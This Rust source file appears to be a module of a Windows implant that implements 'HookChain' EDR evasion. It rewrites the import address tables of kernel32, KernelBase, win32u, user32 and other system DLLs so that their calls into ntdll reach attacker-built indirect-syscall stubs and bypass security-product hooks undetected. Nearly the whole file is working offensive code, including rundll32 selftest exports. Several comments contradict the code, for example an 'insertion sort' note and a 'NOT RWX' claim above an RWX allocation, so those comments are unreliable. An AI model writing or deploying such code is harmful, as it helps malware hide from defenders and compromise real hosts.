//! HookChain — subsystem-layer IAT redirect (P1, `EDR_BLINDNESS_UPGRADE_2026-07.md` §3).
//!
//! ## What this defeats
//! The dominant EDR user-mode detection is **inline hooks on `ntdll.dll`**
//! (a `jmp` patch at each `Nt*` syscall stub prologue). The classic answer
//! — "unhooking" (overwriting ntdll `.text` with a pristine copy) — is now
//! loudly detected via `.text` hash checks. HookChain's insight (Helvio
//! Junior, DEF CON 32) is to **never touch ntdll `.text` at all**: instead,
//! rewrite the **subsystem DLLs' Import Address Table (IAT)** so their
//! indirect calls into ntdll are rerouted to attacker-controlled indirect-
//! syscall stubs. The EDR's ntdll hooks become dead code that is never
//! reached, while ntdll `.text` stays byte-for-byte pristine.
//!
//! Per Vectra's analysis of the DEF CON 32 research, ~94% of EDRs hook ONLY
//! the ntdll layer and have NO hooks at the subsystem-DLL layer
//! (`kernel32.dll` / `KernelBase.dll` / `win32u.dll` / `user32.dll`).
//! `win32u.dll` is especially notable on Win10+: `NtUser*`/`NtGdi*` syscalls
//! route through it, not through ntdll, so EDRs that only instrument ntdll
//! are blind to the entire Win32k surface.
//!
//! ## Mechanism
//! 1. Walk the PEB loader list to find the target subsystem DLLs.
//! 2. For each, parse the PE import directory
//!    (DOS → NT → OptionalHeader → DataDirectory[1] IMPORT).
//! 3. For each `IMAGE_IMPORT_DESCRIPTOR`, walk the
//!    `IMAGE_THUNK_DATA` array (= the IAT for bound imports). Each slot
//!    holds a function pointer that the loader resolved at load time.
//! 4. A slot pointing into `ntdll.dll` (by checking the resolved address
//!    falls within ntdll's mapped range) is an `Nt*`/`Zw*` import the
//!    subsystem DLL uses internally — the very pointer an EDR hook would
//!    intercept.
//! 5. Resolve that function's SSN (Hell/Halo/Tartarus — already done by
//!    `syscalls::Runtime`), `VirtualProtect` the IAT page to RW, overwrite
//!    the slot with a pointer to an indirect-syscall stub, restore the
//!    original protection. Now the subsystem DLL's internal ntdll calls
//!    bypass the EDR hook entirely.
//!
//! ## What this is NOT
//! - Not an unhook: ntdll `.text` is never modified → PE-sieve hash-clean.
//! - Not a global hook removal: it only affects calls originating from the
//!   instrumented subsystem DLLs (the implant's own calls already go through
//!   `syscalls::syscallN` indirect stubs; this closes the gap for paths that
//!   transit kernel32/KernelBase internally, e.g. `VirtualAllocEx` →
//!   `NtAllocateVirtualMemory`).
//! - Does NOT blind ETW-TI / kernel callbacks (those are kernel-mode).
//!
//! ## Single-source-of-truth
//! PE parsing reuses the same DOS→NT→OptionalHeader walk as `resolve.rs` and
//! `unhook.rs`. SSN resolution + the indirect-syscall trampoline page come
//! from `syscalls::Runtime`. No algorithm is forked.

#![cfg(target_os = "windows")]

use crate::resolve;
use crate::syscalls;
use core::ffi::c_void;

// ---- PE import-directory structures (x64, hand-rolled for PIC) ------------

/// `IMAGE_IMPORT_DESCRIPTOR` — 20 bytes. The last entry in the array is
/// all-zero (the "null terminator").
#[repr(C)]
#[derive(Clone, Copy)]
struct ImageImportDescriptor {
    /// RVA to the ILT (Import Lookup Table) / INT (Import Name Table).
    /// Zero for bound imports (we fall back to FirstThunk in that case).
    original_first_thunk: u32,
    /// Time/date stamp (0 if not bound).
    _time_date_stamp: u32,
    /// Forwarder chain (0 if none).
    _forwarder_chain: u32,
    /// RVA to the imported DLL name (NUL-terminated ASCII).
    name: u32,
    /// RVA to the IAT (Import Address Table). After the loader resolves
    /// imports, each slot holds the ABSOLUTE function pointer. This is the
    /// array we rewrite.
    first_thunk: u32,
}

// ---- ntdll range resolution (for "does this IAT slot point into ntdll?") ---

/// The absolute `[base, base + size)` range of the in-process ntdll image.
/// Cached on first call (ntdll doesn't move). Used to test whether a given
/// IAT slot's resolved pointer is an ntdll function.
fn ntdll_range() -> Option<(*mut u8, usize)> {
    // PEB-walk to find ntdll base; SizeOfImage from its PE OptionalHeader.
    // `resolve::module_base_by_name` already does the PEB walk + returns base.
    let base = unsafe { resolve::module_base_by_name(b"ntdll.dll")? };
    // Parse SizeOfImage: DOS → NT → OptionalHeader. SizeOfImage is at
    // OptionalHeader offset 56 (same in PE32 and PE32+).
    unsafe {
        let e_lfanew = core::ptr::read_unaligned(base.add(0x3C) as *const i32) as usize;
        let nt = base.add(e_lfanew);
        let opt = nt.add(24);
        let size_of_image = core::ptr::read_unaligned(opt.add(56) as *const u32) as usize;
        Some((base, size_of_image))
    }
}

/// True if `addr` falls within the in-process ntdll image range.
fn is_in_ntdll(addr: usize, ntdll_base: *mut u8, ntdll_size: usize) -> bool {
    let start = ntdll_base as usize;
    let end = start.checked_add(ntdll_size).unwrap_or(usize::MAX);
    addr >= start && addr < end
}

// ---- Subsystem DLL target list --------------------------------------------

/// The subsystem DLLs whose IATs we redirect. These are the layers ABOVE
/// ntdll that internally call `Nt*` exports — the ones an EDR hook on ntdll
/// would intercept. All are always-loaded on a modern Win10/11 process.
///
/// `win32u.dll` is the 2026 key target: it carries `NtUser*`/`NtGdi*`
/// syscall stubs that bypass ntdll entirely on Win10+.
const SUBSYSTEM_DLLS: &[&[u8]] = &[
    b"kernel32.dll\0",
    b"KernelBase.dll\0",
    b"win32u.dll\0",
    b"user32.dll\0",
    b"gdi32.dll\0",
    b"advapi32.dll\0",
];

// ---- IAT redirect core ----------------------------------------------------

/// Redirect every ntdll-pointing IAT slot in the given module to an
/// indirect-syscall stub. Returns the count of slots redirected.
///
/// For each `IMAGE_IMPORT_DESCRIPTOR` whose `name` is "ntdll.dll", walks the
/// IAT (`first_thunk` array). Each slot whose current value (the loader-
/// resolved absolute pointer) falls inside the ntdll range is an `Nt*`/`Zw*`
/// import — rewrite it to point at a fresh indirect-syscall stub built from
/// the resolved SSN + the runtime's ntdll `syscall;ret` gadget.
///
/// # Safety
/// `module_base` must be a valid mapped PE image. The IAT page is flipped to
/// RW via `VirtualProtect` (PEB-resolved kernel32) for the write window, then
/// restored. Single-threaded beacon context.
unsafe fn redirect_module_iat(module_base: *mut u8, rva_ssn: &[RvaSsn]) -> usize {
    let rt = match syscalls::global() {
        Some(r) => r,
        None => return 0, // indirect-syscall runtime not initialized — cannot build stubs
    };
    let (ntdll_base, ntdll_size) = match ntdll_range() {
        Some(r) => r,
        None => return 0,
    };

    // PE parse: DOS → e_lfanew → NT → OptionalHeader → DataDirectory[1] (IMPORT).
    let e_lfanew = core::ptr::read_unaligned(module_base.add(0x3C) as *const i32) as usize;
    let nt = module_base.add(e_lfanew);
    // Sanity: PE signature.
    if core::ptr::read_unaligned(nt as *const u32) != 0x0000_4550 {
        return 0; // "PE\0\0"
    }
    let opt = nt.add(24);
    let magic = core::ptr::read_unaligned(opt as *const u16);
    // DataDirectory offset: PE32 (96) vs PE32+ (112).
    let data_dir_off = if magic == 0x20B { 112 } else { 96 };
    let import_rva = core::ptr::read_unaligned(opt.add(data_dir_off + 8) as *const u32) as usize;
    if import_rva == 0 {
        return 0; // no import directory
    }
    let import_dir = module_base.add(import_rva) as *const ImageImportDescriptor;

    // Resolve VirtualProtect (kernel32) for the RW flip.
    let vp_addr = match resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
        Some(a) => a,
        None => return 0,
    };
    type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
    let vp: VirtualProtect = core::mem::transmute(vp_addr);

    let mut redirected = 0usize;
    // Walk the IMAGE_IMPORT_DESCRIPTOR array (20 bytes each) until the null
    // terminator (all-zero entry).
    let mut idx = 0isize;
    loop {
        let desc = unsafe { &*import_dir.offset(idx) };
        // Null terminator check: name == 0 (a descriptor with name=0 is the end).
        if desc.name == 0 && desc.first_thunk == 0 {
            break;
        }
        // The IAT is `first_thunk`. (original_first_thunk / ILT is the
        // pre-binding copy; after load, first_thunk holds resolved pointers.)
        let iat_rva = desc.first_thunk as usize;
        if iat_rva == 0 {
            idx += 1;
            continue;
        }
        let iat = module_base.add(iat_rva) as *mut usize;

        // Walk the IAT (8-byte slots on x64) until a zero slot (end of array).
        let mut slot_idx = 0isize;
        loop {
            let slot_ptr = unsafe { iat.offset(slot_idx) };
            let current = unsafe { core::ptr::read_volatile(slot_ptr) };
            if current == 0 {
                break; // end of this DLL's IAT
            }
            // Is the resolved pointer an ntdll function?
            if is_in_ntdll(current, ntdll_base, ntdll_size) {
                // Resolve the SSN via the RVA→SSN table (built from the
                // pristine ntdll export dir + runtime SSN table — hook-proof).
                let rva_in_ntdll = current - (ntdll_base as usize);
                if let Some(ssn) = lookup_ssn_by_rva(rva_ssn, rva_in_ntdll) {
                    // Build an indirect-syscall stub for this SSN.
                    let stub_bytes = nyx_evasion::stub::indirect_stub(ssn, rt.gadget());
                    // Allocate a small RWX trampoline for this stub. We reuse
                    // the runtime's single trampoline page IF only one stub
                    // is active at a time (the runtime does this for its own
                    // syscallN calls). But for IAT redirect we need PERSISTENT
                    // stubs (the IAT slot must point at a valid stub for the
                    // process lifetime, not be overwritten by the next
                    // syscallN). So allocate dedicated trampolines.
                    let stub_addr = alloc_persistent_stub(&stub_bytes);
                    if stub_addr != 0 {
                        // Flip the IAT page to RW, write the stub pointer,
                        // restore. The IAT page may be shared (read-only after
                        // binding), so VirtualProtect is required.
                        let mut old: u32 = 0;
                        let page_addr = slot_ptr as *mut c_void;
                        let ok = unsafe {
                            vp(page_addr, 8, 0x04 /* PAGE_READWRITE */, &mut old)
                        };
                        if ok != 0 {
                            unsafe { core::ptr::write(slot_ptr, stub_addr) };
                            // Restore original protection (closes the RW window).
                            let mut dummy: u32 = 0;
                            unsafe { vp(page_addr, 8, old, &mut dummy) };
                            redirected += 1;
                        }
                    }
                }
            }
            slot_idx += 1;
        }
        idx += 1;
    }
    redirected
}

/// A sorted (RVA, SSN) pair, used for binary-search lookup during redirect.
/// Built once per `apply()` call from the pristine ntdll export table joined
/// with the runtime's SSN table — NEVER from in-process stub bytes (which may
/// be hooked by any EDR on any Windows version).
#[repr(C)]
#[derive(Clone, Copy)]
struct RvaSsn {
    rva: u32,
    ssn: u32,
}

/// Build the RVA→SSN lookup table by joining the ntdll export directory
/// (name → RVA) with the runtime's SSN table (name → SSN). Both sources are
/// derived from a **pristine** ntdll at runtime-init time (the export RVAs
/// come from the in-process export directory which is hook-proof — EDRs hook
/// stub *bytes*, never the export *directory*; the SSNs come from the runtime
/// which resolved them over a fresh KnownDlls/disk ntdll map). This table is
/// therefore correct on ANY Windows version with ANY EDR hook strategy.
///
/// Returns a Vec sorted by RVA for binary search. Empty on failure.
fn build_rva_ssn_table(rt: &syscalls::Runtime) -> crate::heap::Vec<RvaSsn> {
    let mut out: crate::heap::Vec<RvaSsn> = crate::heap::Vec::new();
    // Walk the in-process ntdll export directory (hook-proof: hooks patch
    // stub bytes, not the export directory structure). This gives (name, RVA).
    let ntdll = match resolve::LiveNtdll::locate() {
        Some(n) => n,
        None => return out,
    };
    let exports = ntdll.exports_iter(); // &[(HeapStr, u32_rva)]
    for (name, rva) in exports {
        // Look up the SSN for this export by name hash in the runtime table.
        // HeapStr::to_string_lossy allocates a temporary; bind it so the
        // borrow lives through the djb2 call.
        let name_lower = name.to_string_lossy();
        // djb2 is case-insensitive (folds to lowercase internally).
        let hash = resolve::djb2(name_lower.as_bytes());
        if let Some(ssn) = rt.ssn_by_hash(hash) {
            // Only Nt*/Zw* exports have SSNs; ssn_by_hash returns None for
            // non-syscall exports, filtering them out automatically.
            if ssn != u32::MAX {
                out.push(RvaSsn { rva: *rva, ssn });
            }
        }
    }
    // Sort by RVA for binary search (insertion sort — table is ~500 entries).
    out.sort_by_key(|e| e.rva);
    out
}

/// Binary-search the sorted RVA→SSN table for `target_rva`. Returns the SSN
/// or None if the RVA isn't a known syscall stub.
fn lookup_ssn_by_rva(table: &[RvaSsn], target_rva: usize) -> Option<u32> {
    let target = target_rva as u32;
    let mut lo = 0isize;
    let mut hi = table.len() as isize - 1;
    while lo <= hi {
        let mid = lo + (hi - lo) / 2;
        let entry = &table[mid as usize];
        if entry.rva == target {
            return Some(entry.ssn);
        }
        if entry.rva < target {
            lo = mid + 1;
        } else {
            hi = mid - 1;
        }
    }
    None
}

// ---- Persistent stub allocation -------------------------------------------

/// A small arena of persistent indirect-syscall trampolines. Each redirected
/// IAT slot needs its OWN stub (the runtime's shared trampoline is reused
/// per-call and would be overwritten). We allocate a fixed page and parcel
/// out ~32-byte slots from it.
const STUB_SIZE: usize = 32;
const STUBS_PER_PAGE: usize = 4096 / STUB_SIZE; // 128 stubs per page

static STUB_PAGE: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
static STUB_CURSOR: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// Allocate a persistent executable stub and write `bytes` into it. Returns
/// the stub's address (0 on failure). The stub lives for the process lifetime
/// (bump allocator within a single RX page).
///
/// # Safety
/// Resolves `VirtualAlloc` (kernel32) via PEB walk. Writes `bytes.len()`
/// bytes into executable memory. Single-threaded.
unsafe fn alloc_persistent_stub(bytes: &[u8]) -> usize {
    if bytes.len() > STUB_SIZE {
        return 0;
    }
    // Lazy-allocate the page on first use.
    let mut page = STUB_PAGE.load(core::sync::atomic::Ordering::Acquire);
    if page == 0 {
        let va = match resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") {
            Some(a) => a,
            None => return 0,
        };
        type VirtualAlloc = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
        let f: VirtualAlloc = core::mem::transmute(va);
        // PAGE_EXECUTE_READ (0x20) — NOT RWX. We flip to RWX briefly for the
        // write, then back to RX (W^X discipline, same as syscalls.rs).
        let p = unsafe {
            f(
                core::ptr::null_mut(),
                0x1000,
                0x3000,
                0x40, /* RWX initially */
            )
        };
        if p.is_null() {
            return 0;
        }
        page = p as usize;
        STUB_PAGE.store(page, core::sync::atomic::Ordering::Release);
        STUB_CURSOR.store(0, core::sync::atomic::Ordering::Release);
    }

    // Bump-allocate a slot.
    let slot_idx = STUB_CURSOR.fetch_add(1, core::sync::atomic::Ordering::AcqRel);
    if slot_idx >= STUBS_PER_PAGE {
        return 0; // arena exhausted (128 redirected stubs — plenty for subsystem DLLs)
    }
    let stub_addr = page + slot_idx * STUB_SIZE;

    // Write the stub bytes. The page might be locked down to RX on subsequent apply() calls.
    // Transition to RWX before copying, then back to the old protection.
    let mut old_protect: u32 = 0;
    type FnVP = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
    let vp_resolved = unsafe { resolve::export_addr(b"kernel32.dll", b"VirtualProtect") };
    if let Some(vp_addr) = vp_resolved {
        let vp: FnVP = core::mem::transmute(vp_addr);
        unsafe {
            vp(
                stub_addr as *mut c_void,
                STUB_SIZE,
                0x40, /* RWX */
                &mut old_protect,
            );
        }
    }
    unsafe {
        core::ptr::copy_nonoverlapping(bytes.as_ptr(), stub_addr as *mut u8, bytes.len());
    }
    if let Some(vp_addr) = vp_resolved {
        let vp: FnVP = core::mem::transmute(vp_addr);
        let mut dummy: u32 = 0;
        unsafe {
            vp(stub_addr as *mut c_void, STUB_SIZE, old_protect, &mut dummy);
        }
    }
    stub_addr
}

/// After all stubs are written, flip the stub page from RWX → RX to close
/// the permanent-RWX IOC (Moneta/PE-sieve flag permanently RWX pages).
fn lockdown_stub_page() {
    let page = STUB_PAGE.load(core::sync::atomic::Ordering::Acquire);
    if page == 0 {
        return;
    }
    if let Some(vp_addr) = unsafe { resolve::export_addr(b"kernel32.dll", b"VirtualProtect") } {
        type VirtualProtect = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
        let vp: VirtualProtect = unsafe { core::mem::transmute(vp_addr) };
        let mut old: u32 = 0;
        unsafe {
            vp(page as *mut c_void, 0x1000, 0x20 /* RX */, &mut old)
        };
    }
}

// ---- Public API -----------------------------------------------------------

/// Apply HookChain IAT redirection to all target subsystem DLLs. Call once at
/// bootstrap (after `syscalls::init_global` resolves the SSN table) and
/// optionally re-run per-cycle if the EDR re-instruments.
///
/// Returns the total count of IAT slots redirected across all DLLs.
///
/// # Safety
/// PEB-walk + PE parse + VirtualProtect + stub writes. Single-threaded beacon
/// bootstrap context. Must run AFTER `syscalls::init_global` (needs the SSN
/// table + the ntdll `syscall;ret` gadget address).
pub unsafe fn apply() -> usize {
    // Reset the stub arena for each apply() call so the page is allocated
    // fresh (RWX).  Reusing an already-locked-down (RX) page from a prior
    // apply() causes an AV when alloc_persistent_stub writes to it — the
    // VirtualProtect inside alloc_persistent_stub may race or fail, and the
    // copy is outside the VP guard.  A fresh page per apply() is simpler and
    // the old page (locked down to RX, leaked) is harmless in a beacon context.
    STUB_PAGE.store(0, core::sync::atomic::Ordering::Release);
    STUB_CURSOR.store(0, core::sync::atomic::Ordering::Release);

    let rt = match syscalls::global() {
        Some(r) => r,
        None => return 0,
    };
    // Build the hook-proof RVA→SSN table once (pristine ntdll export dir +
    // runtime SSN table). Correct on any Windows version / any EDR hooks.
    let rva_ssn = build_rva_ssn_table(rt);
    let mut total = 0usize;
    for &name in SUBSYSTEM_DLLS {
        // Trim the NUL for module_base_by_name (it compares against the
        // loader's base_dll_name which doesn't include NUL).
        let trimmed = name.split(|&b| b == 0).next().unwrap_or(name);
        if let Some(base) = unsafe { resolve::module_base_by_name(trimmed.as_ref()) } {
            total += unsafe { redirect_module_iat(base, &rva_ssn) };
        }
    }
    // Lock down the stub page to RX (W^X) after all stubs are written.
    lockdown_stub_page();
    total
}

// ---- Selftest entry -------------------------------------------------------

/// `rundll32 nyx_implant_win.dll,nyx_selftest_hookchain` — applies HookChain
/// and reports the redirect count via exit code:
///   0xC0 = runtime not initialized (call after bootstrap)
///   0xC1..0xFE = count of redirected slots (capped)
#[cfg(feature = "selftest")]
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_hookchain() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
    let do_exit = |code: u32| -> ! {
        if let Some(e) = exit_proc {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(e) };
            f(code);
        }
        loop {
            core::hint::spin_loop();
        }
    };
    if syscalls::global().is_none() {
        do_exit(0xC0);
    }
    let count = unsafe { apply() };
    do_exit(count.min(0xFE) as u32);
}

/// `rundll32 nyx_implant_win.dll,nyx_selftest_hookchain_full` — **combined**
/// selftest that first initializes the indirect-syscall runtime (the same
/// `syscalls::init_global()` bootstrap calls), then runs `hookchain::apply()`.
/// Use this to validate the IAT redirect count on a host without running the
/// full beacon bootstrap.
///
/// Exit codes:
///   0xC0 = runtime init failed (LiveNtdll::locate or SSN resolution failed)
///   0xC1..0xFE = count of redirected slots (capped). >0 = hookchain works.
#[cfg(feature = "selftest")]
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_hookchain_full() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
    let do_exit = |code: u32| -> ! {
        if let Some(e) = exit_proc {
            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(e) };
            f(code);
        }
        loop {
            core::hint::spin_loop();
        }
    };
    // 1. Initialize the indirect-syscall runtime.
    crate::syscalls::init_global();
    if syscalls::global().is_none() {
        do_exit(0xC0);
    }
    // 2. Apply HookChain IAT redirect. apply() returns the redirected count.
    //    Exit = count directly (capped at u8 max = 255). >0 = hookchain works.
    let count = unsafe { apply() };
    do_exit((count & 0xFF) as u32);
}
